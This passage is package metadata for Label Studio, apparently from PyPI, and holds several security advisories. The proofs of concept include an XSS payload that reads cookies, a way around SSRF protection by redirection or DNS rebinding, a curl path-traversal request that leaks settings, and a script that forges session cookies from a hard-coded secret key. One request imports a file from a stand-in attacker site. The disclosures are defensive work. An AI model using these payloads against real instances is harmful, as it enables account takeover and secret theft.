main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"0.7.4":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: MIT License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":"","project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/0.7.4/","requires_dist":["appdirs (==1.4.3)","attrs (==19.1.0)","blis (==0.4.1)","certifi (==2019.11.28)","chardet (==3.0.4)","Click (==7.0)","cymem (==2.0.3)","Flask (==1.1.1)","idna (==2.8)","itsdangerous (==1.1.0)","Jinja2 (==2.10.3)","lxml (>=4.2.5)","MarkupSafe (==1.1.1)","mixpanel (==4.4.0)","numpy (==1.17.4)","python-dateutil (==2.8.1)","pytz (==2019.3)","requests (==2.22.0)","six (==1.12.0)","srsly (==0.2.0)","tqdm (==4.40.2)","urllib3 (==1.25.7)","wasabi (==0.4.2)","Werkzeug (==0.16.0)","orjson (>=2.0.11)","rarfile (==3.1)","flask-api (>=2.0)","pandas (>=0.24.0)","jsonschema (>=3.2.0)","xmljson (==0.2.0)","rq (>=1.0)","boto3 (>=1.12.32)","google-cloud-storage (==1.28.1)","flask-wtf (==0.14.3)","label-studio-converter (>=0.0.18rc0)","htmlmin (==0.1.12)","gevent (>=20.6.2)","ujson (==3.0.0)"],"requires_python":">=3.5","summary":"Label Studio annotation tool","version":"0.7.4","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"958ead78c9a073bf9579cdb5996d13cc4c64a997026d8e0a80915e0c8fdd717e","md5":"3486e72d1c25f2441015ce0a8dd8bce2","sha256":"c570031c7e72c57763a52ebdf51f078e9b2358676cf6ad0eac1c6e0835fd0dc3"},"downloads":-1,"filename":"label_studio-0.7.4-py3-none-any.whl","has_sig":false,"md5_digest":"3486e72d1c25f2441015ce0a8dd8bce2","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.5","size":6924769,"upload_time":"2020-08-13T13:34:10","upload_time_iso_8601":"2020-08-13T13:34:10.995343Z","url":"https://files.pythonhosted.org/packages/95/8e/ad78c9a073bf9579cdb5996d13cc4c64a997026d8e0a80915e0c8fdd717e/label_studio-0.7.4-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"88552f88eef5c21f25b1c29bdd9d0bb4db8bd18fd6a7dad408cf27feab696f06","md5":"046d54f4ff60a65735ca07bc0a7765db","sha256":"164e8a8d5cb3d6d0ae5df2ee63ffe11acc3fad18b8eb18f5201413d867fd9676"},"downloads":-1,"filename":"label-studio-0.7.4.tar.gz","has_sig":false,"md5_digest":"046d54f4ff60a65735ca07bc0a7765db","packagetype":"sdist","python_version":"source","requires_python":">=3.5","size":6853049,"upload_time":"2020-08-13T13:34:19","upload_time_iso_8601":"2020-08-13T13:34:19.730804Z","url":"https://files.pythonhosted.org/packages/88/55/2f88eef5c21f25b1c29bdd9d0bb4db8bd18fd6a7dad408cf27feab696f06/label-studio-0.7.4.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF. This issue is fixed in version 1.6.0.","fixed_in":["1.6.0"],"id":"GHSA-pc6f-259w-w3j6","link":"https://osv.dev/vulnerability/GHSA-pc6f-259w-w3j6","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF.","fixed_in":["1.5.0.post0"],"id":"PYSEC-2022-300","link":"https://osv.dev/vulnerability/PYSEC-2022-300","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n","fixed_in":["1.7.2"],"id":"GHSA-cpmr-mw4j-99r7","link":"https://osv.dev/vulnerability/GHSA-cpmr-mw4j-99r7","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could 